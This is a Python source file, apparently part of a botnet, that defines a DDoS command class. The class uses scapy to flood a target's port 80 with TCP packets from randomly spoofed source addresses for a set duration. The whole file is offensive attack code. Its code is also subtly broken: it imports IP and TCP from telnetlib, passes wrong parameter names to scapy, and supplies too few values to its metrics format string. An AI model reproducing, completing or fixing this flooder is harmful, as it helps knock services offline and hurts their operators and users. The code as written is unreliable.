from telnetlib import IP, TCP
import random
from scapy.all import *
from botnet.commands.command_base import CommandBase

class Ddos(CommandBase):
    def __init__(self, target_ip, source_port, max_duration):
        self.target_ip = target_ip
        self.source_port = source_port
        self.max_duration = max_duration

    def get_metrics(self):
        return "Start time: {}\nEnd time: {}\nDuration: {}s\nNumber of packets sent: {}".format(time.ctime(self.start_time), time.ctime(self.end_time), (self.end_time-self.start_time))
    
    def execute(self):
        self._num_packets = 0

        self.start_time = time.time()
        while True:
            a = str(random.randint(1,254))
            b = str(random.randint(1,254))
            c = str(random.randint(1,254))
            d = str(random.randint(1,254)) 
            
            source_ip = f"{a}.{b}.{c}.{d}"
            IP1 = IP(source_IP = source_ip, destination = self.target_ip)
            TCP1 = TCP(srcport = self.source_port, dstport = 80)
            pkt = IP1 / TCP1
            send(pkt,inter = 0.001)
            self._num_packets+=1

            if (time.time() - self.start_time) >= self.max_duration:
                break
        self.end_time = time.time()

    